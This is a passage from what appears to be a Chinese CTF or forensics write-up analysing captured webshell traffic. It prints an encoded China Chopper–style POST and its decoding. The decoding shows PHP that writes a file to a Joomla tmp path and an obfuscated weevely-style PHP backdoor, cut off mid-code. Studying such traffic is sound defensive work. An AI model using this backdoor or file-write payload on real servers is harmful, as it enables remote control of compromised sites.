class="hljs-number">1</span>lKDAp<span class="hljs-meta">O2</span>Vja<span class="hljs-name">G8</span>oIi<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">2</span>BfCIpOzskZj<span class="hljs-number">1</span>iYX<span class="hljs-symbol">NlNjRfZGVjb2</span>RlKCRfUE<span class="hljs-number">9</span>TVFsiejEiXSk<span class="hljs-number">7</span>JG<span class="hljs-name">M9</span>JF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span><span class="hljs-symbol">NUWyJ6</span>MiJdOyRjPX<span class="hljs-symbol">N0</span>cl<span class="hljs-number">9</span>yZXBsYW<span class="hljs-symbol">NlKCJcciIsIiIsJGMpOyRjPXN0</span>cl<span class="hljs-number">9</span>yZXBsYW<span class="hljs-symbol">NlKCJcbiIsIiIsJGMpOyRidWY9</span>IiI<span class="hljs-number">7</span>Z<span class="hljs-name">m9</span>yKCRpPTA<span class="hljs-number">7</span>JGk<span class="hljs-number">8</span>c<span class="hljs-number">3</span>RybGVuKCRjKTskaSs<span class="hljs-number">9</span>MikkY<span class="hljs-symbol">nVmLj11</span>cmxkZW<span class="hljs-symbol">NvZGUoIiUiLnN1</span>Y<span class="hljs-symbol">nN0</span>cigkYywkaSwyKSk<span class="hljs-number">7</span>ZW<span class="hljs-symbol">NobyhAZndyaXRlKGZvcGVuKCRmLCJ3</span>IiksJGJ<span class="hljs-number">1</span>Zik<span class="hljs-meta">%</span><span class="hljs-number">2</span>FIjEiOiIwIik<span class="hljs-number">7</span><span class="hljs-meta">O2</span>Vja<span class="hljs-name">G8</span>oI<span class="hljs-symbol">nw8</span>LSIp<span class="hljs-meta">O2</span>RpZSgpOw<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br><br>&amp;z<span class="hljs-number">1</span>=L<span class="hljs-number">3</span>Zhci<span class="hljs-number">93</span>d<span class="hljs-number">3</span>cvaHRtbC<span class="hljs-number">9</span>qb<span class="hljs-number">29</span>tbGEvd<span class="hljs-name">G1</span>wL<span class="hljs-number">2</span>Zvb<span class="hljs-number">3</span>Rlci<span class="hljs-number">5</span>waHA<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br><br>&amp;z<span class="hljs-number">2</span>=<span class="hljs-number">3</span>C<span class="hljs-number">3</span>F<span class="hljs-number">7068700</span>A<span class="hljs-number">24703</span>D<span class="hljs-number">276</span>C<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>F<span class="hljs-number">776572223</span>B<span class="hljs-number">24693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">246</span>D<span class="hljs-number">5</span>B<span class="hljs-number">315</span>D<span class="hljs-number">5</span>B<span class="hljs-number">305</span>D<span class="hljs-number">2</span>E<span class="hljs-number">246</span>D<span class="hljs-number">5</span>B<span class="hljs-number">315</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>B<span class="hljs-number">315</span>D<span class="hljs-number">3</span>B<span class="hljs-number">24683</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">736</span>C<span class="hljs-number">28247373286</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">64352824692</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">246</span>B<span class="hljs-number">68292</span>C<span class="hljs-number">303</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>C<span class="hljs-number">3329293</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">24663</span>D<span class="hljs-number">24733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>C<span class="hljs-number">2824733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">73286</span>D<span class="hljs-number">6435273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24643</span>D<span class="hljs-number">275</span>D<span class="hljs-number">713</span>D<span class="hljs-number">61727261795</span>F<span class="hljs-number">763</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">616</span>C<span class="hljs-number">756573283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2471293</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">707265675</span>F<span class="hljs-number">6</span>D<span class="hljs-number">617463685</span>F<span class="hljs-number">613</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>C<span class="hljs-number">6</span>C<span class="hljs-number">28222</span>F<span class="hljs-number">283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>B<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">775</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">295</span>B<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">772</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>D<span class="hljs-number">2</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">283</span>F<span class="hljs-number">3</span>A<span class="hljs-number">3</span>B<span class="hljs-number">713</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">302</span>E<span class="hljs-number">285</span>B<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">645</span>D<span class="hljs-number">29293</span>F<span class="hljs-number">2</span>C<span class="hljs-number">3</span>F<span class="hljs-number">2</span>F<span class="hljs-number">222</span>C<span class="hljs-number">3</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24573</span>D<span class="hljs-number">27292</span>C<span class="hljs-number">247373283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24735</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24695</span>D<span class="hljs-number">2</span>C<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">302</span>C<span class="hljs-number">24652929292</span>C<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>B<span class="hljs-number">2929293</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">246</span>F<span class="hljs-number">3</span>D<span class="hljs-number">6</span>F<span class="hljs-number">625</span>F<span class="hljs-number">6765745</span>F<span class="hljs-number">636</span>F<span class="hljs-number">6</span>E<span class="hljs-number">74656</span>E<span class="hljs-number">743</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7328293</span>B<span class="hljs-number">6</span>F<span class="hljs-number">625</span>F<span class="hljs-number">656</span>E<span class="hljs-number">645</span>F<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">636</span>C<span class="hljs-number">65616</span>E<span class="hljs-number">28293</span>B<span class="hljs-number">24643</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">62617365273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24653</span>D<span class="hljs-number">275</span>D<span class="hljs-number">545</span>F<span class="hljs-number">4</span>C<span class="hljs-number">414</span>E<span class="hljs-number">4755414745225</span>D<span class="hljs-number">3</span>B<span class="hljs-number">6966282472723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2626243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7261297</span>B<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">753</span>D<span class="hljs-number">706172733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">655</span>F<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">75726</span>C<span class="hljs-number">28247272293</span>B<span class="hljs-number">7061723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">73655</span>F<span class="hljs-number">73743</span>E<span class="hljs-number">5</span>D<span class="hljs-number">722824755</span>B<span class="hljs-number">223</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7175657279225</span>D<span class="hljs-number">2</span>C<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">71293</span>B<span class="hljs-number">243</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24453</span>D<span class="hljs-number">273</span>E<span class="hljs-number">5</span>D<span class="hljs-number">36345</span>F<span class="hljs-number">653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>E<span class="hljs-number">636</span>F<span class="hljs-number">643</span>E<span class="hljs-number">5</span>D<span class="hljs-number">653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7828677</span>A<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">636</span>F<span class="hljs-number">6</span>D<span class="hljs-number">707265737328246</span>F<span class="hljs-number">292</span>C<span class="hljs-number">246</span>B<span class="hljs-number">29293</span>B<span class="hljs-number">7072693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>E<span class="hljs-number">7428223</span>C<span class="hljs-number">246</span>B<span class="hljs-number">3</span>E<span class="hljs-number">24643</span>C<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>F<span class="hljs-number">246</span>B<span class="hljs-number">3</span>E<span class="hljs-number">223</span>E<span class="hljs-number">5</span>D<span class="hljs-number">293</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">403</span>E<span class="hljs-number">5</span>D<span class="hljs-number">73657373696</span>F<span class="hljs-number">6</span>E<span class="hljs-number">5</span>F<span class="hljs-number">64657374723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>F<span class="hljs-number">7928293</span>B<span class="hljs-number">7</span>D<span class="hljs-number">7</span>D<span class="hljs-number">7</span>D<span class="hljs-number">7</span>D<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24743</span>D<span class="hljs-number">272824692</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">246</span>B<span class="hljs-number">66292</span>C<span class="hljs-number">302</span>C<span class="hljs-number">333</span>E<span class="hljs-number">5</span>D<span class="hljs-number">29293</span>B<span class="hljs-number">24703</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">22223</span>B<span class="hljs-number">666</span>F<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7228247</span>A<span class="hljs-number">3</span>D<span class="hljs-number">313</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">247</span>A<span class="hljs-number">3</span>C<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">636</span>F<span class="hljs-number">756</span>E<span class="hljs-number">7428246</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>B<span class="hljs-number">315</span>D<span class="hljs-number">293</span>B<span class="hljs-number">247</span>A<span class="hljs-number">2</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>B<span class="hljs-number">2924703</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>E<span class="hljs-number">3</span>D<span class="hljs-number">24715</span>B<span class="hljs-number">246</span>D<span class="hljs-number">5</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">325</span>D<span class="hljs-number">5</span>B<span class="hljs-number">247</span>A<span class="hljs-number">5</span>D<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">693</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">244</span>D<span class="hljs-number">3</span>D<span class="hljs-number">275</span>D<span class="hljs-number">2472612</span>C<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>D<span class="hljs-number">293</span>B<span class="hljs-number">69662824713</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2626246</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">297</span>B<span class="hljs-number">4073657373693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>F<span class="hljs-number">6</span>E<span class="hljs-number">5</span>F<span class="hljs-number">7374613</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">727428293</span>B<span class="hljs-number">24733</span>D<span class="hljs-number">26243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>F<span class="hljs-number">534553533</span>E<span class="hljs-number">5</span>D<span class="hljs-number">494</span>F<span class="hljs-number">4</span>E<span class="hljs-number">3</span>B<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">733</span>D<span class="hljs-number">22737562737472223</span>B<span class="hljs-number">24736</span>C<span class="hljs-number">3</span>D<span class="hljs-number">22733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7472746</span>F<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24503</span>D<span class="hljs-number">275</span>D<span class="hljs-number">6628733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">74723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">706</span>F<span class="hljs-number">732824703</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>C<span class="hljs-number">2468293</span>D<span class="hljs-number">3</span>D<span class="hljs-number">3</span>D<span class="hljs-number">30297</span>B<span class="hljs-number">24735</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24695</span>D<span class="hljs-number">3</span>D<span class="hljs-number">22223</span>B<span class="hljs-number">24703</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">24737328243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">702</span>C<span class="hljs-number">33293</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7</span>D<span class="hljs-number">69662861723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7261793</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>F<span class="hljs-number">6</span>B<span class="hljs-number">65795</span>F<span class="hljs-number">65786973743</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">732824692</span>C<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">73293</span>E<span class="hljs-number">5</span>D<span class="hljs-number">297</span>B<span class="hljs-number">243</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">246</span>A<span class="hljs-number">3</span>D<span class="hljs-number">7374725</span>F<span class="hljs-number">7265706</span>C<span class="hljs-number">61636528276672272</span>C<span class="hljs-number">27272</span>C<span class="hljs-number">2763667272667265617466726672655</span>F<span class="hljs-number">66756</span>E<span class="hljs-number">636672746672696</span>F<span class="hljs-number">6</span>E<span class="hljs-number">27293</span>B<span class="hljs-number">0</span>A<span class="hljs-number">246</span>B<span class="hljs-number">3</span>D<span class="hljs-number">275</span>D<span class="hljs-number">3</span>B<span class="hljs-number">7</span>D<span class="hljs-number">7</span>D<span class="hljs-number">72653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7475726</span>E<span class="hljs-number">20246</span>F<span class="hljs-number">3</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7</span>D<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">723</span>D<span class="hljs-number">245</span>F<span class="hljs-number">534552563</span>E<span class="hljs-number">5</span>D<span class="hljs-number">45523</span>B<span class="hljs-number">2472723</span>D<span class="hljs-number">4024725</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">22485454503</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>F<span class="hljs-number">5245464552453</span>E<span class="hljs-number">5</span>D<span class="hljs-number">52225</span>D<span class="hljs-number">3</span>B<span class="hljs-number">2472613</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">403</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24725</span>B<span class="hljs-number">223</span>E<span class="hljs-number">5</span>D<span class="hljs-number">485454505</span>F<span class="hljs-number">413</span>E<span class="hljs-number">5</span>D<span class="hljs-number">43433</span>E<span class="hljs-number">5</span>D<span class="hljs-number">45503</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24673</span>D<span class="hljs-number">2722223</span>B<span class="hljs-number">666</span>F<span class="hljs-number">72283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24693</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">303</span>B<span class="hljs-number">24693</span>C<span class="hljs-number">246</span>C<span class="hljs-number">3</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">293</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7</span>B<span class="hljs-number">666</span>F<span class="hljs-number">7228246</span>A<span class="hljs-number">3</span>D<span class="hljs-number">303</span>B<span class="hljs-number">28246</span>A<span class="hljs-number">3</span>C<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">246326263</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24693</span>C<span class="hljs-number">246</span>C<span class="hljs-number">293</span>B<span class="hljs-number">243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>A<span class="hljs-number">2</span>B<span class="hljs-number">2</span>B<span class="hljs-number">2</span>C<span class="hljs-number">24693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>B<span class="hljs-number">2</span>B<span class="hljs-number">297</span>B<span class="hljs-number">246</span>F<span class="hljs-number">2</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>D<span class="hljs-number">24747</span>B<span class="hljs-number">24693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">7</span>D<span class="hljs-number">5</span>E<span class="hljs-number">246</span>B<span class="hljs-number">7</span>B<span class="hljs-number">246</span>A<span class="hljs-number">7</span>D<span class="hljs-number">3</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24523</span>D<span class="hljs-number">27246</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">683</span>D<span class="hljs-number">226362343</span>E<span class="hljs-number">5</span>D<span class="hljs-number">32223</span>B<span class="hljs-number">246</span>B<span class="hljs-number">663</span>D<span class="hljs-number">2265313330223</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">66756</span>E<span class="hljs-number">6374696</span>F<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">20782824743</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2</span>C<span class="hljs-number">246</span>B<span class="hljs-number">297</span>B<span class="hljs-number">24633</span>D<span class="hljs-number">733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">74726</span>C<span class="hljs-number">653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>E<span class="hljs-number">28246</span>B<span class="hljs-number">293</span>B<span class="hljs-number">246</span>C<span class="hljs-number">3</span>D<span class="hljs-number">7374726</span>C<span class="hljs-number">653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">282474293</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>B<span class="hljs-number">246</span>F<span class="hljs-number">3</span>D<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24513</span>D<span class="hljs-number">275</span>D<span class="hljs-number">735</span>B<span class="hljs-number">24695</span>D<span class="hljs-number">2</span>E<span class="hljs-number">3</span>D<span class="hljs-number">24703</span>B<span class="hljs-number">24653</span>D<span class="hljs-number">737472703</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>F<span class="hljs-number">73283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">24735</span>B<span class="hljs-number">24693</span>E<span class="hljs-number">5</span>D<span class="hljs-number">5</span>D<span class="hljs-number">2</span>C<span class="hljs-number">2466293</span>B<span class="hljs-number">696628243</span>E<span class="hljs-number">5</span>D<span class="hljs-number">65297</span>B<span class="hljs-number">246</span>B<span class="hljs-number">3</span>D<span class="hljs-number">246</span>B<span class="hljs-number">682</span>E<span class="hljs-number">246</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">663</span>B<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6</span>F<span class="hljs-number">625</span>F<span class="hljs-number">7374613</span>E<span class="hljs-number">5</span>D<span class="hljs-number">727428293</span>B<span class="hljs-number">40653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">76616</span>C<span class="hljs-number">2840677</span>A<span class="hljs-number">756</span>E<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">636</span>F<span class="hljs-number">3</span>E<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24763</span>D<span class="hljs-number">275</span>D<span class="hljs-number">6</span>D<span class="hljs-number">70726573732840783</span>E<span class="hljs-number">5</span>D<span class="hljs-number">2840623</span>E<span class="hljs-number">5</span>D<span class="hljs-number">61733</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6536345</span>F<span class="hljs-number">6465636</span>F<span class="hljs-number">64652870723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">3</span>E<span class="hljs-number">5</span>D<span class="hljs-number">653</span>E<span class="hljs-number">5</span>D<span class="hljs-number">675</span>F<span class="hljs-number">7265706</span>C<span class="hljs-number">613</span>E<span class="hljs-number">5</span>D<span class="hljs-number">636528617272617928222</span>F<span class="hljs-number">5</span>F<span class="hljs-number">2</span>F<span class="hljs-number">222</span>C<span class="hljs-number">222</span>F<span class="hljs-number">2</span>D<span class="hljs-number">2</span>F<span class="hljs-number">22292</span>C<span class="hljs-number">6172723</span>E<span class="hljs-number">5</span>D<span class="hljs-number">6179283</span>E<span class="hljs-number">5</span>D<span class="hljs-number">222</span>F<span class="hljs-number">222</span>C<span class="hljs-number">222</span>B<span class="hljs-number">223</span>E<span class="hljs-number">5</span>D<span class="hljs-number">273</span>B<span class="hljs-number">0</span>A<span class="hljs-number">24783</span>D<span class="hljs-number">7374725</span>F<span class="hljs-number">7265706</span>C<span class="hljs-number">61636528273</span>E<span class="hljs-number">5</span>D<span class="hljs-number">272</span>C<span class="hljs-number">27272</span>C<span class="hljs-number">24522</span>E<span class="hljs-number">24672</span>E<span class="hljs-number">246</span>B<span class="hljs-number">2</span>E<span class="hljs-number">24652</span>E<span class="hljs-number">24642</span>E<span class="hljs-number">244</span>D<span class="hljs-number">2</span>E<span class="hljs-number">24702</span>E<span class="hljs-number">24742</span>E<span class="hljs-number">24502</span>E<span class="hljs-number">24512</span>E<span class="hljs-number">24762</span>E<span class="hljs-number">24572</span>E<span class="hljs-number">2445293</span>B<span class="hljs-number">0</span>A<span class="hljs-number">244</span>E<span class="hljs-number">3</span>D<span class="hljs-number">246</span>A<span class="hljs-number">2827272</span>C<span class="hljs-number">2478293</span>B<span class="hljs-number">244</span>E<span class="hljs-number">28293</span>B<span class="hljs-number">0</span>A<span class="hljs-number">3</span>F<span class="hljs-number">3</span>E<span class="hljs-number">0</span>A<br></code></pre></td></tr></table></figure><p>分别解码得</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs perl">z<span class="hljs-number">0</span>:<br>@ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>);@set_time_limit(<span class="hljs-number">0</span>);@set_magic_quotes_runtime(<span class="hljs-number">0</span>);echo(<span class="hljs-string">&quot;-&gt;|&quot;</span>);;$f=base64_decode($_POST[<span class="hljs-string">&quot;z1&quot;</span>]);$c=$_POST[<span class="hljs-string">&quot;z2&quot;</span>];$c=str_replace(<span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$c);$c=str_replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$c);$buf=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($c);$i+=<span class="hljs-number">2</span>)$buf.=urldecode(<span class="hljs-string">&quot;%&quot;.substr($c,$i,2));echo(@fwrite(fopen($f,&quot;</span>w<span class="hljs-string">&quot;),$buf)?&quot;</span><span class="hljs-number">1</span><span class="hljs-string">&quot;:&quot;</span><span class="hljs-number">0</span><span class="hljs-string">&quot;);;echo(&quot;</span>|&lt;-<span class="hljs-string">&quot;);die();</span><br><span class="hljs-string">z1:</span><br><span class="hljs-string">/var/www/html/joomla/tmp/footer.php</span><br><span class="hljs-string">z2:</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">$p=&#x27;l&gt;]ower&quot;</span>;$i&gt;]=$m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].$m[<span class="hljs-number">1</span>]&gt;][<span class="hljs-number">1</span>];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),<span class="hljs-number">0</span>&gt;],<span class="hljs-number">3</span>))&gt;];$f=$s&gt;]l($s&gt;]s(md5<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$d=&#x27;</span>]<span class="hljs-keyword">q</span>=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(<span class="hljs-string">&quot;/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/&quot;</span>,&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$W=&#x27;</span>),$ss(&gt;]$s[&gt;]$i],&gt;]<span class="hljs-number">0</span>,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end<span class="hljs-number">_</span>&gt;]&gt;]clean();$d=&gt;]base<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$e=&#x27;</span>]T_LANGUAGE<span class="hljs-string">&quot;];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[&quot;</span>&gt;]query<span class="hljs-string">&quot;],$&gt;]q);$&gt;&#x27;;</span><br><span class="hljs-string">$E=&#x27;&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(&quot;</span>&lt;$k&gt;$d&lt;&gt;]/$k&gt;<span class="hljs-string">&quot;&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;&#x27;;</span><br><span class="hljs-string">$t=&#x27;($i.&gt;]$kf),0,3&gt;]));$p&gt;]=&quot;</span><span class="hljs-string">&quot;;fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;&#x27;;</span><br><span class="hljs-string">$M=&#x27;]$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=&quot;</span><span class="hljs-keyword">substr</span><span class="hljs-string">&quot;;$sl=&quot;</span>s&gt;]&gt;]trto<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$P=&#x27;</span>]f(s&gt;]<span class="hljs-keyword">tr</span>&gt;]<span class="hljs-keyword">pos</span>($p&gt;],$h)===<span class="hljs-number">0</span>)&#123;$s[&gt;]$i]=<span class="hljs-string">&quot;&quot;</span>;$p&gt;]=$ss($&gt;]p,<span class="hljs-number">3</span>);&gt;]&#125;<span class="hljs-keyword">if</span>(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">$j=str_replace(&#x27;</span>fr<span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span>cfrrfreatfrfre_funcfrtfrion<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">$k=&#x27;</span>];&#125;&#125;re&gt;]&gt;]turn 